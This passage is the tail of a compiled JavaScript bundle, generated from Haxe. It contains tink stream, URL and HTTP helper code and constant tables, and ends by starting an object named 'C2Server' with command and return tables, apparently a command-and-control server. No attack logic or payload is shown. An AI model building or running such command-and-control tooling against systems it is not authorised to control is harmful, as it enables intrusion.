		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_RegroupResult.Converted(f(i[0]) ? tink_streams_Stream.single(i[0]) : tink_streams_Empty.inst)));
	}};
	return this1;
};
var tink_streams_IdealizeStream = function(target,rescue) {
	tink_streams_IdealStreamBase.call(this);
	this.target = target;
	this.rescue = rescue;
};
tink_streams_IdealizeStream.__name__ = true;
tink_streams_IdealizeStream.__super__ = tink_streams_IdealStreamBase;
tink_streams_IdealizeStream.prototype = $extend(tink_streams_IdealStreamBase.prototype,{
	get_depleted: function() {
		return this.target.get_depleted();
	}
	,next: function() {
		var _gthis = this;
		return tink_core_Future.flatMap(this.target.next(),function(v) {
			if(v._hx_index == 1) {
				var e = v.e;
				return _gthis.rescue(e).idealize(_gthis.rescue).next();
			} else {
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(v));
			}
		});
	}
	,forEach: function(handler) {
		var _gthis = this;
		return tink_core_Future.async(function(cb) {
			_gthis.target.forEach(handler).handle(function(end) {
				switch(end._hx_index) {
				case 0:
					var rest = end.rest;
					cb(tink_streams_Conclusion.Halted(rest.idealize(_gthis.rescue)));
					break;
				case 1:
					var e = end.error;
					var at = end.at;
					cb(tink_streams_Conclusion.Clogged(e,at.idealize(_gthis.rescue)));
					break;
				case 2:
					var e = end.error;
					_gthis.rescue(e).idealize(_gthis.rescue).forEach(handler).handle(cb);
					break;
				case 3:
					cb(tink_streams_Conclusion.Depleted);
					break;
				}
			});
		});
	}
	,__class__: tink_streams_IdealizeStream
});
var tink_streams_Single = function(value) {
	tink_streams_StreamBase.call(this);
	this.value = value;
};
tink_streams_Single.__name__ = true;
tink_streams_Single.__super__ = tink_streams_StreamBase;
tink_streams_Single.prototype = $extend(tink_streams_StreamBase.prototype,{
	next: function() {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Step.Link(tink_core_Lazy.get(this.value),tink_streams_Empty.inst)));
	}
	,forEach: function(handle) {
		var _gthis = this;
		return tink_core_Future.map(handle(tink_core_Lazy.get(this.value)),function(step) {
			switch(step._hx_index) {
			case 0:
				return tink_streams_Conclusion.Halted(_gthis);
			case 1:
				return tink_streams_Conclusion.Halted(tink_streams_Empty.inst);
			case 2:
				return tink_streams_Conclusion.Depleted;
			case 3:
				var e = step.e;
				return tink_streams_Conclusion.Clogged(e,_gthis);
			}
		});
	}
	,__class__: tink_streams_Single
});
var tink_streams_Handler = {};
tink_streams_Handler._new = function(f) {
	var this1 = f;
	return this1;
};
tink_streams_Handler.apply = function(this1,item) {
	return this1(item);
};
tink_streams_Handler.ofSafeSync = function(f) {
	var this1 = function(i) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(f(i)));
	};
	return this1;
};
tink_streams_Handler.ofUnknownSync = function(f) {
	var this1 = function(i) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(f(i)));
	};
	return this1;
};
tink_streams_Handler.ofSafe = function(f) {
	var this1 = f;
	return this1;
};
tink_streams_Handler.ofUnknown = function(f) {
	var this1 = f;
	return this1;
};
var tink_streams_Reducer = {};
tink_streams_Reducer._new = function(f) {
	var this1 = f;
	return this1;
};
tink_streams_Reducer.apply = function(this1,res,item) {
	return this1(res,item);
};
tink_streams_Reducer.ofSafeSync = function(f) {
	var this1 = function(res,cur) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(f(res,cur)));
	};
	return this1;
};
tink_streams_Reducer.ofUnknownSync = function(f) {
	var this1 = function(res,cur) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(f(res,cur)));
	};
	return this1;
};
tink_streams_Reducer.ofSafe = function(f) {
	var this1 = f;
	return this1;
};
tink_streams_Reducer.ofPlainSync = function(f) {
	var this1 = function(res,cur) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_ReductionStep.Progress(f(res,cur))));
	};
	return this1;
};
tink_streams_Reducer.ofUnknown = function(f) {
	var this1 = f;
	return this1;
};
tink_streams_Reducer.ofPromiseBased = function(f) {
	var this1 = function(res,cur) {
		return tink_core_Future.map(f(res,cur),function(s) {
			switch(s._hx_index) {
			case 0:
				var r = s.data;
				return tink_streams_ReductionStep.Progress(r);
			case 1:
				var e = s.failure;
				return tink_streams_ReductionStep.Crash(e);
			}
		});
	};
	return this1;
};
var tink_streams_FutureStream = function(f) {
	tink_streams_StreamBase.call(this);
	this.f = f;
};
tink_streams_FutureStream.__name__ = true;
tink_streams_FutureStream.__super__ = tink_streams_StreamBase;
tink_streams_FutureStream.prototype = $extend(tink_streams_StreamBase.prototype,{
	next: function() {
		return tink_core_Future.flatMap(this.f,function(s) {
			return s.next();
		});
	}
	,forEach: function(handler) {
		var _gthis = this;
		return tink_core_Future.async(function(cb) {
			_gthis.f.handle(function(s) {
				s.forEach(handler).handle(cb);
			});
		});
	}
	,__class__: tink_streams_FutureStream
});
var tink_streams_BlendStream = function(a,b) {
	var first = null;
	var wait = function(s) {
		return tink_core_Future.map(s.next(),function(o) {
			if(first == null) {
				first = s;
			}
			return o;
		});
	};
	var n1 = wait(a);
	var n2 = wait(b);
	tink_streams_Generator.call(this,tink_core_Future.async(function(cb) {
		tink_core_Future.first(n1,n2).handle(function(o) {
			switch(o._hx_index) {
			case 0:
				var item = o.value;
				var rest = o.next;
				cb(tink_streams_Step.Link(item,new tink_streams_BlendStream(rest,first == a ? b : a)));
				break;
			case 1:
				var e = o.e;
				cb(tink_streams_Step.Fail(e));
				break;
			case 2:
				(first == a ? n2 : n1).handle(cb);
				break;
			}
		});
	}));
};
tink_streams_BlendStream.__name__ = true;
tink_streams_BlendStream.__super__ = tink_streams_Generator;
tink_streams_BlendStream.prototype = $extend(tink_streams_Generator.prototype,{
	__class__: tink_streams_BlendStream
});
var tink_streams_Step = $hxEnums["tink.streams.Step"] = { __ename__:true,__constructs__:null
	,Link: ($_=function(value,next) { return {_hx_index:0,value:value,next:next,__enum__:"tink.streams.Step",toString:$estr}; },$_._hx_name="Link",$_.__params__ = ["value","next"],$_)
	,Fail: ($_=function(e) { return {_hx_index:1,e:e,__enum__:"tink.streams.Step",toString:$estr}; },$_._hx_name="Fail",$_.__params__ = ["e"],$_)
	,End: {_hx_name:"End",_hx_index:2,__enum__:"tink.streams.Step",toString:$estr}
};
tink_streams_Step.__constructs__ = [tink_streams_Step.Link,tink_streams_Step.Fail,tink_streams_Step.End];
var tink_streams_SignalStream = function(signal) {
	var this1 = tink_core_Future.map(tink_core_Signal.nextTime(signal),function(o) {
		switch(o._hx_index) {
		case 0:
			var data = o.data;
			return tink_streams_Step.Link(data,new tink_streams_SignalStream(signal));
		case 1:
			var e = o.e;
			return tink_streams_Step.Fail(e);
		case 2:
			return tink_streams_Step.End;
		}
	});
	this1.eager();
	tink_streams_Generator.call(this,this1);
};
tink_streams_SignalStream.__name__ = true;
tink_streams_SignalStream.__super__ = tink_streams_Generator;
tink_streams_SignalStream.prototype = $extend(tink_streams_Generator.prototype,{
	__class__: tink_streams_SignalStream
});
var tink_streams_Yield = $hxEnums["tink.streams.Yield"] = { __ename__:true,__constructs__:null
	,Data: ($_=function(data) { return {_hx_index:0,data:data,__enum__:"tink.streams.Yield",toString:$estr}; },$_._hx_name="Data",$_.__params__ = ["data"],$_)
	,Fail: ($_=function(e) { return {_hx_index:1,e:e,__enum__:"tink.streams.Yield",toString:$estr}; },$_._hx_name="Fail",$_.__params__ = ["e"],$_)
	,End: {_hx_name:"End",_hx_index:2,__enum__:"tink.streams.Yield",toString:$estr}
};
tink_streams_Yield.__constructs__ = [tink_streams_Yield.Data,tink_streams_Yield.Fail,tink_streams_Yield.End];
var tink_streams_nodejs_NodejsStream = function(target) {
	tink_streams_Generator.call(this,tink_core_Future.async(function(cb) {
		target.read().handle(function(o) {
			var cb1 = cb;
			var tmp;
			switch(o._hx_index) {
			case 0:
				var _g = o.data;
				if(_g == null) {
					tmp = tink_streams_Step.End;
				} else {
					var data = _g;
					tmp = tink_streams_Step.Link(data,new tink_streams_nodejs_NodejsStream(target));
				}
				break;
			case 1:
				var e = o.failure;
				tmp = tink_streams_Step.Fail(e);
				break;
			}
			cb1(tmp);
		});
	}));
};
tink_streams_nodejs_NodejsStream.__name__ = true;
tink_streams_nodejs_NodejsStream.wrap = function(name,native,onEnd) {
	return new tink_streams_nodejs_NodejsStream(new tink_streams_nodejs_WrappedReadable(name,native,onEnd));
};
tink_streams_nodejs_NodejsStream.__super__ = tink_streams_Generator;
tink_streams_nodejs_NodejsStream.prototype = $extend(tink_streams_Generator.prototype,{
	__class__: tink_streams_nodejs_NodejsStream
});
var tink_streams_nodejs_WrappedReadable = function(name,native,onEnd) {
	this.name = name;
	this.native = native;
	var this1 = tink_core_Future.async(function(cb) {
		native.once("end",function() {
			cb(tink_core_Outcome.Success(null));
		});
		native.once("close",function() {
			cb(tink_core_Outcome.Success(null));
		});
		native.once("error",function(e) {
			cb(tink_core_Outcome.Failure(new tink_core_TypedError(null,"" + e.code + " - Failed reading from " + name + " because " + e.message,{ fileName : "tink/streams/nodejs/WrappedReadable.hx", lineNumber : 21, className : "tink.streams.nodejs.WrappedReadable", methodName : "new"})));
		});
	});
	this1.eager();
	this.end = this1;
	if(onEnd != null) {
		this.end.handle(function() {
			process.nextTick(onEnd);
		});
	}
};
tink_streams_nodejs_WrappedReadable.__name__ = true;
tink_streams_nodejs_WrappedReadable.prototype = {
	read: function() {
		var _gthis = this;
		return tink_core_Future.first(tink_core_Future.async(function(cb) {
			var attempt = null;
			attempt = function() {
				try {
					var _g = _gthis.native.read();
					if(_g == null) {
						_gthis.native.once("readable",attempt);
					} else {
						var object = _g;
						cb(tink_core_Outcome.Success(object));
					}
				} catch( _g ) {
					var e = haxe_Exception.caught(_g).unwrap();
					cb(tink_core_Outcome.Failure(tink_core_TypedError.withData(null,"Error while reading from " + _gthis.name,e,{ fileName : "tink/streams/nodejs/WrappedReadable.hx", lineNumber : 41, className : "tink.streams.nodejs.WrappedReadable", methodName : "read"})));
				}
			};
			attempt();
		}),this.end);
	}
	,__class__: tink_streams_nodejs_WrappedReadable
};
var tink_url_Auth = {};
tink_url_Auth._new = function(user,password) {
	var this1 = "" + user + ":" + password;
	return this1;
};
tink_url_Auth.get_user = function(this1) {
	if(this1 == null) {
		return null;
	} else {
		return this1.split(":")[0];
	}
};
tink_url_Auth.get_password = function(this1) {
	if(this1 == null) {
		return null;
	} else {
		return this1.split(":")[1];
	}
};
tink_url_Auth.toString = function(this1) {
	if(this1 == null) {
		return "";
	} else {
		return "" + this1 + "@";
	}
};
var tink_url_Host = {};
tink_url_Host._new = function(name,port) {
	var this1;
	if(port == null) {
		this1 = name;
	} else if(port > 65535 || port <= 0) {
		throw haxe_Exception.thrown("Invalid port");
	} else {
		this1 = "" + name + ":" + port;
	}
	return this1;
};
tink_url_Host.get_name = function(this1) {
	if(this1 == null) {
		return null;
	} else {
		var _g = this1.split("]");
		switch(_g.length) {
		case 1:
			var v = _g[0];
			return v.split(":")[0];
		case 2:
			var _g1 = _g[1];
			var v = _g[0];
			return v + "]";
		default:
			throw haxe_Exception.thrown("assert");
		}
	}
};
tink_url_Host.get_port = function(this1) {
	if(this1 == null) {
		return null;
	} else {
		var _g = this1.split("]");
		switch(_g.length) {
		case 1:
			var v = _g[0];
			var _g1 = v.split(":")[1];
			if(_g1 == null) {
				return null;
			} else {
				var p = _g1;
				return Std.parseInt(p);
			}
			break;
		case 2:
			var _g1 = _g[0];
			var v = _g[1];
			var _g = v.split(":")[1];
			if(_g == null) {
				return null;
			} else {
				var p = _g;
				return Std.parseInt(p);
			}
			break;
		default:
			throw haxe_Exception.thrown("assert");
		}
	}
};
tink_url_Host.toString = function(this1) {
	return this1;
};
var tink_url_Path = {};
tink_url_Path.parts = function(this1) {
	var _g = [];
	var _g1 = 0;
	var _g2 = this1.split("/");
	while(_g1 < _g2.length) {
		var p = _g2[_g1];
		++_g1;
		if(p != "") {
			var this1 = p;
			_g.push(this1);
		}
	}
	return _g;
};
tink_url_Path.get_absolute = function(this1) {
	return this1.charAt(0) == "/";
};
tink_url_Path.get_isDir = function(this1) {
	return this1.charAt(this1.length - 1) == "/";
};
tink_url_Path._new = function(s) {
	var this1 = s;
	return this1;
};
tink_url_Path.join = function(this1,that) {
	if(that == "") {
		return this1;
	} else if(that.charAt(0) == "/") {
		return that;
	} else if(this1.charAt(this1.length - 1) == "/") {
		return tink_url_Path.ofString(this1 + that);
	} else {
		var _g = this1.lastIndexOf("/");
		if(_g == -1) {
			return that;
		} else {
			var v = _g;
			return tink_url_Path.ofString(HxOverrides.substr(this1,0,v + 1) + (that == null ? "null" : that));
		}
	}
};
tink_url_Path.ofString = function(s) {
	var this1 = tink_url_Path.normalize(s);
	return this1;
};
tink_url_Path.normalize = function(s) {
	s = StringTools.trim(StringTools.replace(s,"\\","/"));
	if(s == ".") {
		return "./";
	}
	var isDir = StringTools.endsWith(s,"/..") || StringTools.endsWith(s,"/") || StringTools.endsWith(s,"/.");
	var parts = [];
	var isAbsolute = StringTools.startsWith(s,"/");
	var up = 0;
	var _g = 0;
	var _g1 = s.split("/");
	while(_g < _g1.length) {
		var part = _g1[_g];
		++_g;
		var _g2 = StringTools.trim(part);
		switch(_g2) {
		case "":
			break;
		case ".":
			break;
		case "..":
			if(parts.pop() == null) {
				++up;
			}
			break;
		default:
			var v = _g2;
			parts.push(v);
		}
	}
	if(isAbsolute) {
		parts.unshift("");
	} else {
		var _g = 0;
		var _g1 = up;
		while(_g < _g1) {
			var i = _g++;
			parts.unshift("..");
		}
	}
	if(isDir) {
		parts.push("");
	}
	return parts.join("/");
};
tink_url_Path.toString = function(this1) {
	return this1;
};
var tink_url_Portion = {};
tink_url_Portion.get_raw = function(this1) {
	return this1;
};
tink_url_Portion.isValid = function(this1) {
	if(this1 != null) {
		try {
			decodeURIComponent(this1.split("+").join(" "));
			return true;
		} catch( _g ) {
			return false;
		}
	} else {
		return true;
	}
};
tink_url_Portion._new = function(v) {
	var this1 = v;
	return this1;
};
tink_url_Portion.stringly = function(this1) {
	return tink_url_Portion.toString(this1);
};
tink_url_Portion.toString = function(this1) {
	if(this1 == null) {
		return null;
	} else {
		try {
			return decodeURIComponent(this1.split("+").join(" "));
		} catch( _g ) {
			return "";
		}
	}
};
tink_url_Portion.ofString = function(s) {
	var this1 = s == null ? "" : encodeURIComponent(s);
	return this1;
};
var tink_url_PortionArray = {};
tink_url_PortionArray.toStringArray = function(this1) {
	var _g = [];
	var _g1 = 0;
	while(_g1 < this1.length) {
		var p = this1[_g1];
		++_g1;
		_g.push(tink_url_Portion.toString(p));
	}
	return _g;
};
var tink_url_Query = {};
tink_url_Query.parse = function(this1) {
	return new tink_url__$Query_QueryStringParser(this1,"&","=",0);
};
tink_url_Query.with = function(this1,values) {
	var this2 = [];
	var ret = this2;
	var _g = [];
	var key = new haxe_ds__$StringMap_StringMapKeyIterator(values.h);
	while(key.hasNext()) {
		var key1 = key.next();
		_g.push(key1);
	}
	var insert = _g;
	var p = new tink_url__$Query_QueryStringParser(this1,"&","=",0);
	while(p.hasNext()) {
		var p1 = p.next();
		var key = tink_url_Portion.ofString(p1.name);
		if(Object.prototype.hasOwnProperty.call(values.h,key)) {
			var name = tink_url_Portion.ofString(p1.name);
			var key1 = tink_url_Portion.ofString(p1.name);
			ret.push(name + "=" + values.h[key1]);
			HxOverrides.remove(insert,tink_url_Portion.ofString(p1.name));
		} else {
			ret.push(tink_url_Portion.ofString(p1.name) + "=" + p1.value);
		}
	}
	var _g = 0;
	while(_g < insert.length) {
		var name = insert[_g];
		++_g;
		ret.push(name + "=" + values.h[name]);
	}
	return ret.join("&");
};
tink_url_Query.iterator = function(this1) {
	return new tink_url__$Query_QueryStringParser(this1,"&","=",0);
};
tink_url_Query.toMap = function(this1) {
	var _g = new haxe_ds_StringMap();
	var p = new tink_url__$Query_QueryStringParser(this1,"&","=",0);
	while(p.hasNext()) {
		var p1 = p.next();
		_g.h[p1.name.toString()] = p1.value;
	}
	return _g;
};
tink_url_Query.ofObj = function(v) {
	var this1 = [];
	var ret = this1;
	var v1 = v;
	var _g = 0;
	var _g1 = Reflect.fields(v1);
	while(_g < _g1.length) {
		var k = _g1[_g];
		++_g;
		ret.push(tink_url_Portion.ofString(k) + "=" + tink_url_Portion.ofString(v1[k]));
	}
	return ret.join("&");
};
tink_url_Query.toString = function(this1) {
	return this1;
};
tink_url_Query.build = function() {
	var this1 = [];
	return this1;
};
tink_url_Query.parseString = function(s,sep,set,pos) {
	if(pos == null) {
		pos = 0;
	}
	if(set == null) {
		set = "=";
	}
	if(sep == null) {
		sep = "&";
	}
	return new tink_url__$Query_QueryStringParser(s,sep,set,pos);
};
var tink_url_QueryStringBuilder = {};
tink_url_QueryStringBuilder._new = function() {
	var this1 = [];
	return this1;
};
tink_url_QueryStringBuilder.add = function(this1,name,value) {
	this1.push(name + "=" + value);
	return this1;
};
tink_url_QueryStringBuilder.toString = function(this1,sep) {
	if(sep == null) {
		sep = "&";
	}
	return this1.join(sep);
};
tink_url_QueryStringBuilder.copy = function(this1) {
	return this1.slice();
};
var tink_url__$Query_QueryStringParser = function(s,sep,set,pos) {
	this.s = s == null ? "" : s;
	this.sep = sep;
	this.set = set;
	this.pos = pos;
};
tink_url__$Query_QueryStringParser.__name__ = true;
tink_url__$Query_QueryStringParser.trimmedSub = function(s,start,end) {
	if(start >= s.length) {
		var this1 = "";
		return this1;
	}
	while(s.charCodeAt(start) < 33) ++start;
	if(end < s.length - 1) {
		while(s.charCodeAt(end - 1) < 33) --end;
	}
	var this1 = s.substring(start,end);
	return this1;
};
tink_url__$Query_QueryStringParser.prototype = {
	hasNext: function() {
		return this.pos < this.s.length;
	}
	,next: function() {
		var next = this.s.indexOf(this.sep,this.pos);
		if(next == -1) {
			next = this.s.length;
		}
		var split = this.s.indexOf(this.set,this.pos);
		var start = this.pos;
		this.pos = next + this.sep.length;
		if(split == -1 || split > next) {
			return new tink_core_NamedWith(tink_url_Portion.toString(tink_url__$Query_QueryStringParser.trimmedSub(this.s,start,next)),tink_url_Portion.ofString(""));
		} else {
			return new tink_core_NamedWith(tink_url_Portion.toString(tink_url__$Query_QueryStringParser.trimmedSub(this.s,start,split)),tink_url__$Query_QueryStringParser.trimmedSub(this.s,split + this.set.length,next));
		}
	}
	,__class__: tink_url__$Query_QueryStringParser
};
function $getIterator(o) { if( o instanceof Array ) return new haxe_iterators_ArrayIterator(o); else return o.iterator(); }
function $bind(o,m) { if( m == null ) return null; if( m.__id__ == null ) m.__id__ = $global.$haxeUID++; var f; if( o.hx__closures__ == null ) o.hx__closures__ = {}; else f = o.hx__closures__[m.__id__]; if( f == null ) { f = m.bind(o); o.hx__closures__[m.__id__] = f; } return f; }
$global.$haxeUID |= 0;
if(typeof(performance) != "undefined" ? typeof(performance.now) == "function" : false) {
	HxOverrides.now = performance.now.bind(performance);
}
if( String.fromCodePoint == null ) String.fromCodePoint = function(c) { return c < 0x10000 ? String.fromCharCode(c) : String.fromCharCode((c>>10)+0xD7C0)+String.fromCharCode((c&0x3FF)+0xDC00); }
String.prototype.__class__ = String;
String.__name__ = true;
Array.__name__ = true;
Date.prototype.__class__ = Date;
Date.__name__ = "Date";
var Int = { };
var Dynamic = { };
var Float = Number;
var Bool = Boolean;
var Class = { };
var Enum = { };
haxe_ds_ObjectMap.count = 0;
js_Boot.__toStr = ({ }).toString;
if(ArrayBuffer.prototype.slice == null) {
	ArrayBuffer.prototype.slice = js_lib__$ArrayBuffer_ArrayBufferCompat.sliceImpl;
}
C2Server.codes_tables = new haxe_ds_StringMap();
C2Server.command_tables = new haxe_ds_StringMap();
C2Server.return_tables = new haxe_ds_StringMap();
DateTools.DAY_SHORT_NAMES = ["Sun","Mon","Tue","Wed","Thu","Fri","Sat"];
DateTools.DAY_NAMES = ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"];
DateTools.MONTH_SHORT_NAMES = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
DateTools.MONTH_NAMES = ["January","February","March","April","May","June","July","August","September","October","November","December"];
haxe_crypto_Base64.CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
haxe_crypto_Base64.BYTES = haxe_io_Bytes.ofString(haxe_crypto_Base64.CHARS);
haxe_io_FPHelper.i64tmp = (function($this) {
	var $r;
	var this1 = new haxe__$Int64__$_$_$Int64(0,0);
	$r = this1;
	return $r;
}(this));
haxe_io_FPHelper.helper = new DataView(new ArrayBuffer(8));
httpstatus_HttpStatusCode.Continue = 100;
httpstatus_HttpStatusCode.SwitchingProtocols = 101;
httpstatus_HttpStatusCode.Processing = 102;
httpstatus_HttpStatusCode.OK = 200;
httpstatus_HttpStatusCode.Created = 201;
httpstatus_HttpStatusCode.Accepted = 202;
httpstatus_HttpStatusCode.NonAuthoritativeInformation = 203;
httpstatus_HttpStatusCode.NoContent = 204;
httpstatus_HttpStatusCode.ResetContent = 205;
httpstatus_HttpStatusCode.PartialContent = 206;
httpstatus_HttpStatusCode.MultiStatus = 207;
httpstatus_HttpStatusCode.AlreadyReported = 208;
httpstatus_HttpStatusCode.IMUsed = 226;
httpstatus_HttpStatusCode.MultipleChoices = 300;
httpstatus_HttpStatusCode.MovedPermanently = 301;
httpstatus_HttpStatusCode.Found = 302;
httpstatus_HttpStatusCode.SeeOther = 303;
httpstatus_HttpStatusCode.NotModified = 304;
httpstatus_HttpStatusCode.UseProxy = 305;
httpstatus_HttpStatusCode.SwitchProxy = 306;
httpstatus_HttpStatusCode.TemporaryRedirect = 307;
httpstatus_HttpStatusCode.PermanentRedirect = 308;
httpstatus_HttpStatusCode.BadRequest = 400;
httpstatus_HttpStatusCode.Unauthorized = 401;
httpstatus_HttpStatusCode.PaymentRequired = 402;
httpstatus_HttpStatusCode.Forbidden = 403;
httpstatus_HttpStatusCode.NotFound = 404;
httpstatus_HttpStatusCode.MethodNotAllowed = 405;
httpstatus_HttpStatusCode.NotAcceptable = 406;
httpstatus_HttpStatusCode.ProxyAuthenticationRequired = 407;
httpstatus_HttpStatusCode.RequestTimeout = 408;
httpstatus_HttpStatusCode.Conflict = 409;
httpstatus_HttpStatusCode.Gone = 410;
httpstatus_HttpStatusCode.LengthRequired = 411;
httpstatus_HttpStatusCode.PreconditionFailed = 412;
httpstatus_HttpStatusCode.PayloadTooLarge = 413;
httpstatus_HttpStatusCode.URITooLong = 414;
httpstatus_HttpStatusCode.UnsupportedMediaType = 415;
httpstatus_HttpStatusCode.RangeNotSatisfiable = 416;
httpstatus_HttpStatusCode.ExpectationFailed = 417;
httpstatus_HttpStatusCode.ImATeapot = 418;
httpstatus_HttpStatusCode.MisdirectedRequest = 421;
httpstatus_HttpStatusCode.UnprocessableEntity = 422;
httpstatus_HttpStatusCode.Locked = 423;
httpstatus_HttpStatusCode.FailedDependency = 424;
httpstatus_HttpStatusCode.UpgradeRequired = 426;
httpstatus_HttpStatusCode.PreconditionRequired = 428;
httpstatus_HttpStatusCode.TooManyRequests = 429;
httpstatus_HttpStatusCode.RequestHeaderFieldsTooLarge = 431;
httpstatus_HttpStatusCode.UnavailableForLegalReasons = 451;
httpstatus_HttpStatusCode.InternalServerError = 500;
httpstatus_HttpStatusCode.NotImplemented = 501;
httpstatus_HttpStatusCode.BadGateway = 502;
httpstatus_HttpStatusCode.ServiceUnavailable = 503;
httpstatus_HttpStatusCode.GatewayTimeout = 504;
httpstatus_HttpStatusCode.HTTPVersionNotSupported = 505;
httpstatus_HttpStatusCode.VariantAlsoNegotiates = 506;
httpstatus_HttpStatusCode.InsufficientStorage = 507;
httpstatus_HttpStatusCode.LoopDetected = 508;
httpstatus_HttpStatusCode.NotExtended = 510;
httpstatus_HttpStatusCode.NetworkAuthenticationRequired = 511;
tink__$Chunk_EmptyChunk.EMPTY = new haxe_io_Bytes(new ArrayBuffer(0));
tink_Chunk.EMPTY = new tink__$Chunk_EmptyChunk();
tink_Stringly.SUPPORTED_DATE_REGEX = new EReg("^(\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2})(\\.\\d{3})?(Z|[\\+-]\\d{2}:\\d{2})$","");
tink_Url.SCHEME = 2;
tink_Url.PAYLOAD = 3;
tink_Url.AUTH = 6;
tink_Url.HOSTNAMES = 7;
tink_Url.PATH = 8;
tink_Url.QUERY = 10;
tink_Url.HASH = 12;
tink_core_Callback.depth = 0;
tink_core_Callback.MAX_DEPTH = 500;
tink_core_AlreadyDisposed.INST = new tink_core_AlreadyDisposed();
tink_core_Future.NOISE = new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(null));
tink_core_Future.NULL = tink_core_Future.NOISE;
tink_core_Future.NEVER = new tink_core__$Future_NeverFuture();
tink_core_Lazy.NOISE = new tink_core__$Lazy_LazyConst(null);
tink_core_Lazy.NULL = tink_core_Lazy.NOISE;
tink_core_Noise.Noise = null;
tink_core_ProgressValue.ZERO = (function($this) {
	var $r;
	var this1 = new tink_core_MPair(0,haxe_ds_Option.None);
	var this2 = this1;
	$r = this2;
	return $r;
}(this));
tink_core_Progress.INIT = tink_core_ProgressValue.ZERO;
tink_core_Promise.NOISE = new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(null)));
tink_core_Promise.NULL = tink_core_Promise.NOISE;
tink_core_Promise.NEVER = tink_core_Future.NEVER;
tink_core__$Signal_Disposed.INST = new tink_core__$Signal_Disposed();
tink_http_ChunkedParser.LINEBREAK = tink_chunk_Seekable.ofBytes(haxe_io_Bytes.ofString("\r\n"));
tink_http_HeaderValue.DAYS = "Sun,Mon,Tue,Wen,Thu,Fri,Sat".split(",");
tink_http_HeaderValue.MONTHS = "Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec".split(",");
tink_http_HeaderName.REFERER = "referer";
tink_http_HeaderName.HOST = "host";
tink_http_HeaderName.SET_COOKIE = "set-cookie";
tink_http_HeaderName.COOKIE = "cookie";
tink_http_HeaderName.CONTENT_TYPE = "content-type";
tink_http_HeaderName.CONTENT_LENGTH = "content-length";
tink_http_HeaderName.CONTENT_DISPOSITION = "content-disposition";
tink_http_HeaderName.CONTENT_RANGE = "content-range";
tink_http_HeaderName.ACCEPT = "accept";
tink_http_HeaderName.ACCEPT_ENCODING = "accept-encoding";
tink_http_HeaderName.TRANSFER_ENCODING = "transfer-encoding";
tink_http_HeaderName.RANGE = "range";
tink_http_HeaderName.LOCATION = "location";
tink_http_HeaderName.AUTHORIZATION = "authorization";
tink_http_HeaderName.ORIGIN = "origin";
tink_http_HeaderName.VARY = "vary";
tink_http_HeaderName.CACHE_CONTROL = "cache-control";
tink_http_HeaderName.EXPIRES = "expires";
tink_http_HeaderName.ACCESS_CONTROL_REQUEST_METHOD = "access-control-request-method";
tink_http_HeaderName.ACCESS_CONTROL_REQUEST_HEADERS = "access-control-request-headers";
tink_http_HeaderName.ACCESS_CONTROL_ALLOW_ORIGIN = "access-control-allow-origin";
tink_http_HeaderName.ACCESS_CONTROL_ALLOW_CREDENTIALS = "access-control-allow-credentials";
tink_http_HeaderName.ACCESS_CONTROL_EXPOSE_HEADERS = "access-control-expose-headers";
tink_http_HeaderName.ACCESS_CONTROL_MAX_AGE = "access-control-max-age";
tink_http_HeaderName.ACCESS_CONTROL_ALLOW_METHODS = "access-control-allow-methods";
tink_http_HeaderName.ACCESS_CONTROL_ALLOW_HEADERS = "access-control-allow-headers";
tink_http_HeaderParser.INVALID = tink_io_ParseStep.Failed(new tink_core_TypedError(422,"Invalid HTTP header",{ fileName : "tink/http/Header.hx", lineNumber : 310, className : "tink.http.HeaderParser", methodName : "INVALID"}));
tink_http_Method.GET = "GET";
tink_http_Method.HEAD = "HEAD";
tink_http_Method.OPTIONS = "OPTIONS";
tink_http_Method.POST = "POST";
tink_http_Method.PUT = "PUT";
tink_http_Method.PATCH = "PATCH";
tink_http_Method.DELETE = "DELETE";
tink_io__$Sink_Blackhole.inst = new tink_io__$Sink_Blackhole();
tink_io_SinkYielding.BLACKHOLE = tink_io__$Sink_Blackhole.inst;
tink_streams_Empty.inst = new tink_streams_Empty();
tink_io_Source.EMPTY = tink_streams_Empty.inst;
tink_io_Worker.EAGER = new tink_io__$Worker_EagerWorker();
tink_io_Worker.pool = [tink_io_Worker.EAGER];
tink_url_Path.root = (function($this) {
	var $r;
	var this1 = "/";
	$r = this1;
	return $r;
}(this));
C2Server.main();
})(typeof window != "undefined" ? window : typeof global != "undefined" ? global : typeof self != "undefined" ? self : this);
